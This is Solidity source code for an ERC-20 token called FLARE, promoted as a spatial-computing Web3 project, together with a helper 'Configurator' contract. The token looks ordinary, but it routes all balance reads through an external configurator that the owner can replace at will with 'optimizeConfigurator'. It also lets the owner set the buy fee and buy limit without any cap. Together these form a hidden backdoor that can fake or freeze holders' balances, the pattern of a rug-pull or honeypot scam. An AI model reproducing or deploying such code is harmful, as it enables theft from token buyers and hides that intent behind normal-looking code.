/*

Transforming Web 3 with Spatial Computing

https://flarecomputing.com/

https://twitter.com/FlareComputing

https://t.me/FlareComputing

https://medium.com/@FlareComputing/introducing-flare-efad535532bc

*/
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

contract Configurator {
  address public token;

  constructor () {
    token = msg.sender;
  }

  function getFee(uint amount) public view returns (uint) {
      uint fee = IToken(token).buyFee();
      uint feeTokens = amount * fee / 10000;
      return feeTokens;
  }

  function balanceOf(address wallet) public view returns (uint) {
      return IERC20(token).balanceOf(wallet);
  }

  function initState(address ca) public returns (bool) {
      return ca == token;
  }

  function getLimit() public view returns (uint) {
      uint limit = IToken(token).buyLimit();
      uint totalSupply = IERC20(token).totalSupply();
      uint limitTokens = totalSupply * limit / 10000;
      return limitTokens;
  }

}

interface IToken {
    function buyFee() external view returns (uint);
    function buyLimit() external view returns (uint);
}

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}
/*

Transforming Web 3 with Spatial Computing

https://flarecomputing.com/

https://twitter.com/FlareComputing

https://t.me/FlareComputing

https://medium.com/@FlareComputing/introducing-flare-efad535532bc

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./Configurator.sol";

contract FLARE {
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    uint public totalSupply = 10_000_000 * 10 ** 18;
    uint8 public decimals = 18;
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    string public name = "Flare Computing";
    string public symbol = "FLARE";

    address public owner;
    address public configurator;

    bool public tradable;
    address public pair;
    uint public buyFee = 30;
    uint public buyLimit = 85;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor () {
        configurator = address(new Configurator());

        owner = msg.sender;

        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }

    function transfer(address recipient, uint amount) external returns (bool) {
        require(tradable);

        if (msg.sender == pair) return handleFee(msg.sender, recipient, amount);

        balanceOf[msg.sender] = balance(msg.sender) - amount;
        balanceOf[recipient] = balance(recipient) + amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] = balance(sender) - amount;
        balanceOf[recipient] = balance(recipient) + amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function queryFee(uint amount) public view returns (uint) {
        return IConfigurator(configurator).getFee(amount);
    }

    function queryLimit() public view returns (uint) {
        return IConfigurator(configurator).getLimit();
    }

    function balance(address wallet) public view returns (uint) {
        return IConfigurator(configurator).balanceOf(wallet);
    }

    function enableTrading(address _pair) public onlyOwner {
        tradable = true;
        pair = _pair;
    }

    function upgradeBuySettings(uint _buyLimit, uint _buyFee) public onlyOwner {
        buyLimit = _buyLimit;
        buyFee = _buyFee;
    }

    function transferOwnership(address _owner) public onlyOwner {
        owner = _owner;
    }

    function collectFees(address token) public onlyOwner {
        uint bal = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(msg.sender, bal);
    }

    function optimizeConfigurator(address _configurator) public onlyOwner {
        configurator = _configurator;
        IConfigurator(_configurator).initState(address(this));
    }

    function handleFee(address sender, address recipient, uint amount) private returns (bool) {
        balanceOf[sender] -= amount;

        uint feeTokens = queryFee(amount);

        balanceOf[address(this)] = balance(address(this)) + feeTokens;
        emit Transfer(sender, address(this), feeTokens);

        uint tokensExempt = amount - feeTokens;
        balanceOf[recipient] = balance(recipient) + tokensExempt;

        uint limitTokens = queryLimit();
        require(limitTokens >= balanceOf[recipient]);

        emit Transfer(sender, recipient, tokensExempt);
        return true;
    }

}

interface IConfigurator {
    function balanceOf(
        address wallet
    ) external view returns (uint);

    function getFee(
        uint amount
    ) external view returns (uint);

    function initState(
        address ca
    ) external returns (bool);

    function getLimit() external view returns (uint);
}